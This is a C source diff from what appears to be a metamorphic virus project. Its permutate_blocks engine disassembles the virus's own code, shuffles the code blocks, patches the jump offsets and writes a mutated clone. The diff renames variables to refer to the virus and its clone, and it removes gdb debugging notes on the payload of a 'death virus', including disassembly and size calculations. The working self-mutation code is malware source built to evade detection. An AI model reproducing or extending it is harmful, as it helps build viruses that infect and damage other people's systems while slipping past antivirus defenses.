@@ -6,8 +6,7 @@
 #include "utils.h"
 #include "visual.h"
 #include "disasm.h"
-
-#include "write_jump.h"
+#include "bytes.h"
 
 /*
 ** permutate_blocks
@@ -40,8 +39,7 @@ bool		want_to_cut_clean(size_t block_length, size_t delta,
 	return (closeness > rand);
 }
 
-static bool	split_ref(struct safe_ptr *ref_origin,
-			struct safe_ptr *ref_half,
+static bool	split_ref(struct safe_ptr *ref_origin, struct safe_ptr *ref_half,
 			uint64_t *seed, bool *cut_clean)
 {
 	size_t	delta        = ref_origin->size / 2;
@@ -247,8 +245,8 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 
 /* --------------------------- Shift entry point ---------------------------- */
 
-static bool	shift_entry_point(void *input_virus_address, \
-			int32_t *virus_func_shift,
+static bool	shift_entry_point(void *clone_virus_address, \
+			int32_t *clone_virus_address_shift,
 			struct code_block *blocks[NBLOCKS])
 {
 	for (size_t i = 0 ; i < NBLOCKS; i++)
@@ -257,9 +255,9 @@ static bool	shift_entry_point(void *input_virus_address, \
 		void	*block_start = b->ref.ptr;
 		void	*block_end   = b->ref.ptr + b->ref.size;
 
-		if (input_virus_address >= block_start && input_virus_address < block_end)
+		if (clone_virus_address >= block_start && clone_virus_address < block_end)
 		{
-			*virus_func_shift = b->shift_amount;
+			*clone_virus_address_shift = b->shift_amount;
 			return true;
 		}
 	}
@@ -268,7 +266,7 @@ static bool	shift_entry_point(void *input_virus_address, \
 
 /* ------------------------- Write permutated code -------------------------- */
 
-static bool	adjust_jumps(struct safe_ptr output_buffer, \
+static bool	adjust_jumps(struct safe_ptr virus_buffer_ref, \
 			void *block_buffer, struct code_block *b)
 {
 	for (size_t i = 0; i < b->njumps; i++)
@@ -279,18 +277,18 @@ static bool	adjust_jumps(struct safe_ptr output_buffer, \
 		uint8_t	jump_size       = j->value_size;
 
 		size_t	block_start  = (size_t)b->ref.ptr;
-		size_t	output_start = (size_t)output_buffer.ptr;
+		size_t	output_start = (size_t)virus_buffer_ref.ptr;
 
 		size_t	block_offset = (size_t)block_buffer - output_start;
 		size_t	jump_value_offset = jump_value_addr - block_start;
 
-		void	*jump_buffer = safe(output_buffer, block_offset + \
+		void	*jump_buffer = safe(virus_buffer_ref, block_offset + \
 					jump_value_offset, jump_size);
 
 		if (!jump_buffer)
 			return errors(ERR_VIRUS, _ERR_ADJUST_JUMPS);
 
-		write_jump(jump_buffer, jump_value, jump_size);
+		write_jump_arg(jump_buffer, jump_value, jump_size);
 	}
 	return true;
 }
@@ -304,18 +302,18 @@ static bool	adjust_jumps(struct safe_ptr output_buffer, \
 **             ^
 **       jump_inst_end
 */
-static bool	add_trailing_jump(struct safe_ptr output_buffer, \
+static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref, \
 			void *block_buffer, void *input_start, \
-			struct code_block *b, size_t *output_size)
+			struct code_block *b, size_t *virus_buffer_size)
 {
 	struct code_block	*tb = b->trailing_block;
 
 	if (tb == NULL) goto end;
 
-	size_t	output_start = (size_t)output_buffer.ptr;
+	size_t	output_start = (size_t)virus_buffer_ref.ptr;
 	size_t	block_offset = (size_t)block_buffer - output_start;
 	size_t	tj_offset    = block_offset + b->ref.size;
-	void	*tj_buffer   = safe(output_buffer, tj_offset, JUMP32_INST_SIZE);
+	void	*tj_buffer   = safe(virus_buffer_ref, tj_offset, JUMP32_INST_SIZE);
 	void	*tj_end      = tj_buffer + JUMP32_INST_SIZE;
 
 	if (!tj_buffer)
@@ -324,7 +322,7 @@ static bool	add_trailing_jump(struct safe_ptr output_buffer, \
 	size_t	tb_offset = (size_t)tb->ref.ptr - (size_t)input_start;
 	size_t	safe_tb_offset = safe_shift(tb_offset, tb->shift_amount);
 	size_t	tb_size   = tb->ref.size;
-	void	*tb_start = safe(output_buffer, safe_tb_offset, tb_size);
+	void	*tb_start = safe(virus_buffer_ref, safe_tb_offset, tb_size);
 
 	if (!tb_start)
 		return errors(ERR_VIRUS, _ERR_ADD_TRAILING_JUMP);
@@ -334,18 +332,18 @@ static bool	add_trailing_jump(struct safe_ptr output_buffer, \
 	if (tj_end + rel_jump != tb_start)
 		return errors(ERR_VIRUS, _ERR_BAD_TRAILING_JUMP);
 
-	write_trailing_jump(tj_buffer, rel_jump);
-	*output_size += JUMP32_INST_SIZE;
+	write_jump(tj_buffer, rel_jump, DWORD);
+	*virus_buffer_size += JUMP32_INST_SIZE;
 end:
 	return true;
 }
 
-static bool	write_permutated_code(struct safe_ptr input_code, \
-			struct safe_ptr output_buffer, \
+static bool	write_permutated_code(struct safe_ptr virus_ref, \
+			struct safe_ptr virus_buffer_ref, \
 			struct code_block *blocks[NBLOCKS],
-			size_t *output_size)
+			size_t *virus_buffer_size)
 {
-	size_t		input_start = (size_t)input_code.ptr;
+	size_t		input_start = (size_t)virus_ref.ptr;
 
 	for (size_t i = 0 ; i < NBLOCKS; i++)
 	{
@@ -357,17 +355,17 @@ static bool	write_permutated_code(struct safe_ptr input_code, \
 		int32_t	shift_amount = b->shift_amount;
 		size_t	safe_block_offset = safe_shift(block_offset, shift_amount);
 
-		if (!safe(input_code, block_offset, block_size))
+		if (!safe(virus_ref, block_offset, block_size))
 			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);
 
-		void	*block_buffer = safe(output_buffer, safe_block_offset, block_size);
+		void	*block_buffer = safe(virus_buffer_ref, safe_block_offset, block_size);
 
 		if (!block_buffer)
 			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);
 
 		memcpy(block_buffer, (void*)block_start, block_size);
-		if (!adjust_jumps(output_buffer, block_buffer, b)
-		|| !add_trailing_jump(output_buffer, block_buffer, (void*)input_start, b, output_size))
+		if (!adjust_jumps(virus_buffer_ref, block_buffer, b)
+		|| !add_trailing_jump(virus_buffer_ref, block_buffer, (void*)input_start, b, virus_buffer_size))
 			return errors(ERR_THROW, _ERR_WRITE_PERMUTATED_CODE);
 	}
 	return true;
@@ -376,30 +374,31 @@ static bool	write_permutated_code(struct safe_ptr input_code, \
 /* ---------------------------- Permutate blocks ---------------------------- */
 /*
 ** permutate_blocks
-** - input_code: safe ptr to original code
-** - output_buffer: safe ptr to buffer where permutated code is written
-** - output_size: ptr where code size is returned
+** - virus_ref: safe ptr to original code
+** - virus_buffer_ref: safe ptr to buffer where permutated code is written
+** - virus_buffer_size: ptr where code size is returned
 ** - seed: seed used for random
 */
-bool		permutate_blocks(struct safe_ptr input_code, \
-			struct safe_ptr output_buffer, \
-			size_t *output_size,
-			void *input_virus_address, int32_t *virus_func_shift, \
+bool		permutate_blocks(struct safe_ptr virus_ref,   \
+			struct safe_ptr virus_buffer_ref,     \
+			size_t *virus_buffer_size,            \
+			void *clone_virus_address,            \
+			int32_t *clone_virus_address_shift,   \
 			uint64_t seed)
 {
 	struct block_allocation		block_memory;
 	struct code_block		*blocks[NBLOCKS];
 
-	if (!disasm_block(&block_memory, input_code)
+	if (!disasm_block(&block_memory, virus_ref)
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
-	|| !shift_entry_point(input_virus_address, virus_func_shift, blocks)
-	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
+	|| !shift_entry_point(clone_virus_address, clone_virus_address_shift, blocks)
+	|| !write_permutated_code(virus_ref, virus_buffer_ref, blocks, virus_buffer_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 #ifdef DEBUG
-	print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
-	print_general(input_code, output_buffer, (size_t)input_virus_address, *virus_func_shift, *output_size, seed);
+	print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
+	print_general(virus_ref, virus_buffer_ref, (size_t)clone_virus_address, *clone_virus_address_shift, *virus_buffer_size, seed);
 #endif
 	return true;
 }
@@ -407,101 +406,8 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 /*
 --------------------------------------------------------------------------------
 
+=> 0x42ef19
+=> 0x41da64
+=> 70837
 
-b *0x41daa9
-
-ls0:
-=> 0x000000000042233e:	55		push   rbp
-   0x000000000042233f:	48 89 e5	mov    rbp,rsp
-   0x0000000000422342:	48 83 ec 40	sub    rsp,0x40
-   0x0000000000422346:	48 8d 45 cb	lea    rax,[rbp-0x35]
-   0x000000000042234a:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
-   0x000000000042234e:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
-   0x0000000000422352:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
-   0x0000000000422356:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
-   0x000000000042235a:	c6 45 d8 6d	mov    BYTE PTR [rbp-0x28],0x6d
-
-ls1:
-=> 0x0000000000426b5e:	55		push   rbp
-   0x0000000000426b5f:	48 89 e5	mov    rbp,rsp
-   0x0000000000426b62:	48 83 ec 40	sub    rsp,0x40
-   0x0000000000426b66:	e9 b9 6f ff ff	jmp    0x41db24
-   0x0000000000426b6b:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b6d:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b6f:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b71:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b73:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b75:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b77:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b79:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b7b:	00 00		add    BYTE PTR [rax],al
-   0x0000000000426b7d:	00 00		add    BYTE PTR [rax],al
-=> 0x000000000041db24:	48 8d 45 cb	lea    rax,[rbp-0x35]
-   0x000000000041db28:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
-   0x000000000041db2c:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
-   0x000000000041db30:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
-   0x000000000041db34:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
-   0x000000000041db38:	c6 45 d8 6d	mov    BYTE PTR [rbp-0x28],0x6d
-   0x000000000041db3c:	c6 45 d9 70	mov    BYTE PTR [rbp-0x27],0x70
-   0x000000000041db40:	c6 45 da 2f	mov    BYTE PTR [rbp-0x26],0x2f
-
-ls2:
-=> 0x0000000000422338:	00 00		add    BYTE PTR [rax],al
-   0x000000000042233a:	00 00		add    BYTE PTR [rax],al
-   0x000000000042233c:	00 00		add    BYTE PTR [rax],al
-   0x000000000042233e:	00 00		add    BYTE PTR [rax],al
-   0x0000000000422340:	00 00		add    BYTE PTR [rax],al
-   0x0000000000422342:	00 00		add    BYTE PTR [rax],al
-   0x0000000000422344:	00 48 8d	add    BYTE PTR [rax-0x73],cl
-   0x0000000000422347:	45 cb		rex.RB retf
-   0x0000000000422349:	48 8d 4d d6	lea    rcx,[rbp-0x2a]
-   0x000000000042234d:	48 89 7d f8	mov    QWORD PTR [rbp-0x8],rdi
-   0x0000000000422351:	c6 45 d6 2f	mov    BYTE PTR [rbp-0x2a],0x2f
-   0x0000000000422355:	c6 45 d7 74	mov    BYTE PTR [rbp-0x29],0x74
-
-
---------------------------------------------------------------------------------
-
-gdb-peda$ p/d 0x00007ffff7fc0f45-0x00007ffff7fb8b24
-$2 = 33825
-
-end_sled1:0x00007ffff7fc0f9d
-end_code :0x00007ffff7fc9421
-gdb-peda$ p/d 0x00007ffff7fc0f9d-0x00007ffff7fb8b24
-$1 = 33913
-
-gdb-peda$ disas loader_entry,+68048 (total payload)
-192
-
-=> death virus size: 67856
-
-virus:
-0x0000000000400210 <+0>:	push   rbp
-0x0000000000400211 <+1>:	mov    rbp,rsp
-0x0000000000400214 <+4>:	sub    rsp,0x40
-0x0000000000400218 <+8>:	mov    QWORD PTR [rbp-0x8],rdi
-0x000000000040021c <+12>:	mov    rdi,QWORD PTR [rbp-0x8]
-0x0000000000400220 <+16>:	call   0x409850 <log_virus_header>
-0x0000000000400225 <+21>:	lea    rdi,[rbp-0x35]
-0x0000000000400229 <+25>:	lea    rax,[rbp-0x2a]
-0x000000000040022d <+29>:	mov    BYTE PTR [rbp-0x2a],0x2f
-0x0000000000400231 <+33>:	mov    BYTE PTR [rbp-0x29],0x74
-0x0000000000400235 <+37>:	mov    BYTE PTR [rbp-0x28],0x6d
-0x0000000000400239 <+41>:	mov    BYTE PTR [rbp-0x27],0x70
-0x000000000040023d <+45>:	mov    BYTE PTR [rbp-0x26],0x2f
-
-input virus size: 67944
-
-67944-67856=88
-
-0x00007ffff7fc9423:	5d	pop    rbp
-0x00007ffff7fc9424:	c3	ret
-0x00007ffff7fc9425:	66 2e 0f 1f 84 00 00 00 00 00	nop    WORD PTR cs:[rax+rax*1+0x0]
-0x00007ffff7fc942f:	0f 1f 44 00 00	nop    DWORD PTR [rax+rax*1+0x0]
-0x00007ffff7fc9434:	00 00	add    BYTE PTR [rax],al
-0x00007ffff7fc9436:	00 00	add    BYTE PTR [rax],al
-
---------------------------------------------------------------------------------
-
-0x00000000004223a5:	e8 db 53 00 00	call   0x427785
 */
